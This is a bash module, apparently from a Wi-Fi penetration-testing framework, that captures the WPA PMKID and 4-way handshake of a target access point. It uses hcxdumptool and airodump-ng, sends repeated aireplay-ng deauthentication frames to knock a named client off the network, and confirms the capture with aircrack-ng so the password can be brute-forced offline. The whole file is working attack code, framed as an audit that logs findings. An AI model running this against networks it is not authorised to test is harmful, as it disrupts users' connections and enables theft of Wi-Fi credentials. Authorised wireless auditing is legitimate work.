#!/usr/bin/env bash
# MODULE_META
# NAME="WPA Handshake & PMKID Capture"
# CATEGORY="D"
# DEPS="A1"
# CRITICAL="yes"
# TOOLS="aireplay-ng,aircrack-ng,hcxdumptool,hcxpcapngtool"
# DESC="Capture WPA PMKID and 4-way handshakes for offline cracking"
# REQS="monitor_iface,target_ssid,target_bssid,target_channel"
# PCAP="yes"
# DECODE="wifi_mgmt"

#===============================================================================
#  modules/d1_wpa_handshake.sh
#  D1: WPA Handshake & PMKID Capture (Golden Wrapper)
#
#  METHODOLOGY (SPEC ALIGNED):
#  1. Capture PMKID (clientless) via hcxdumptool.
#  2. Execute capture using TARGET_CLIENT from Go brain.
#  3. Capture 4-way handshake.
#===============================================================================

set -euo pipefail

# Intelligence Insight (Colors)
C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
C_VAR="${ASTRA_COLOR_VAR:-}"
C_BOLD="${ASTRA_COLOR_BOLD:-}"
C_ACTION="${ASTRA_COLOR_ACTION:-}"
C_RESET="${ASTRA_COLOR_RESET:-}"

# Inputs from Environment
INTERFACE="${MONITOR_INTERFACE:-}"
BSSID="${GUEST_BSSID:-}"
CHANNEL="${GUEST_CHANNEL:-}"
CAPTURE_TIME="${CAPTURE_TIME:-60}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="D1"
OUTPUT_BASE="${EVIDENCE_DIR}/${TC_ID}_capture"
TARGET_CLIENT="${TARGET_CLIENT:-}" # Passed from Go brain

if [[ -z "$INTERFACE" || -z "$BSSID" ]]; then
    echo "[!] MONITOR_INTERFACE or GUEST_BSSID not set."
    exit 1
fi

echo -e "${C_PROMPT}[*]${C_RESET} Starting WPA material capture for ${C_VAR}${BSSID}${C_RESET} (Channel: ${C_VAR}${CHANNEL:-auto}${C_RESET})..."

# 1. Phase 1: hcxdumptool PMKID capture (clientless)
echo -e "${C_PROMPT}[*]${C_RESET} Phase 1: hcxdumptool PMKID capture..."
FILTER_FILE=$(mktemp)
echo "${BSSID}" | tr -d ':' | tr '[:upper:]' '[:lower:]' > "$FILTER_FILE"

# hcxdumptool is better for PMKID
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    timeout 15 hcxdumptool -i "$INTERFACE" \
        --filterlist_ap="$FILTER_FILE" \
        --filtermode=2 \
        --enable_status=1 \
        -o "${OUTPUT_BASE}_hcxdump.pcapng" || true
else
    timeout 15 hcxdumptool -i "$INTERFACE" \
        --filterlist_ap="$FILTER_FILE" \
        --filtermode=2 \
        --enable_status=1 \
        -o "${OUTPUT_BASE}_hcxdump.pcapng" > /dev/null 2>&1 || true
fi

rm -f "$FILTER_FILE"

# 2. Phase 2: Handshake Capture Execution
echo -e "${C_PROMPT}[*]${C_RESET} Phase 2: Active Handshake Capture (Target: ${C_VAR}${TARGET_CLIENT:-Passive}${C_RESET})..."

if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-0}" --write "${OUTPUT_BASE}_handshake" --output-format pcap "$INTERFACE" &
else
    airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-0}" --write "${OUTPUT_BASE}_handshake" --output-format pcap "$INTERFACE" > /dev/null 2>&1 &
fi
AIRODUMP_PID=$!

cleanup() { kill "$AIRODUMP_PID" 2>/dev/null || true; }
trap cleanup EXIT

HANDSHAKE_FILE="${OUTPUT_BASE}_handshake-01.cap"
ELAPSED=0
SUCCESS=0

while [[ $ELAPSED -lt $CAPTURE_TIME ]]; do
    PERCENT=$(( ELAPSED * 100 / CAPTURE_TIME ))
    STATUS="Capturing handshake... ($(( CAPTURE_TIME - ELAPSED ))s left)"
    "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PERCENT" --status "$STATUS"

    if [[ -n "$TARGET_CLIENT" ]] && (( ELAPSED % 15 == 0 )); then
        echo -e "[*] Sending deauth to ${C_VAR}$TARGET_CLIENT${C_RESET}..."
        if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
            aireplay-ng --deauth 5 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" || true
        else
            aireplay-ng --deauth 5 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" > /dev/null 2>&1 || true
        fi
    fi

    if [[ -f "$HANDSHAKE_FILE" ]]; then
        if aircrack-ng "$HANDSHAKE_FILE" 2>/dev/null | grep -q "1 handshake"; then
            echo -e "[!] ${C_BOLD}SUCCESS: WPA HANDSHAKE CAPTURED!${C_RESET}"
            SUCCESS=1
            break
        fi
    fi
    sleep 2
    ((ELAPSED+=2))
done

# Standardize output path
FINAL_FILE="${OUTPUT_BASE}_handshake.cap"
if [[ -f "$HANDSHAKE_FILE" ]]; then
    cp "$HANDSHAKE_FILE" "$FINAL_FILE"
fi

if [[ $SUCCESS -eq 1 ]]; then
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "WPA Handshake Captured" \
        --desc "A valid 4-way WPA handshake was successfully intercepted for BSSID ${BSSID}. Captured in ${ELAPSED} seconds." \
        --severity CRITICAL \
        --evidence "$FINAL_FILE" \
        --rationale "Capturing a handshake enables offline brute-force attacks."
else
    echo -e "[+] Capture window complete."
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[$TC_ID] Audit Complete" \
        --desc "Attempted to capture WPA handshake and PMKID for BSSID ${BSSID}." \
        --severity INFO \
        --evidence "$FINAL_FILE" \
        --rationale "Handshake capture requires active client association. Lack of capture reduces immediate risk."
fi

exit 0
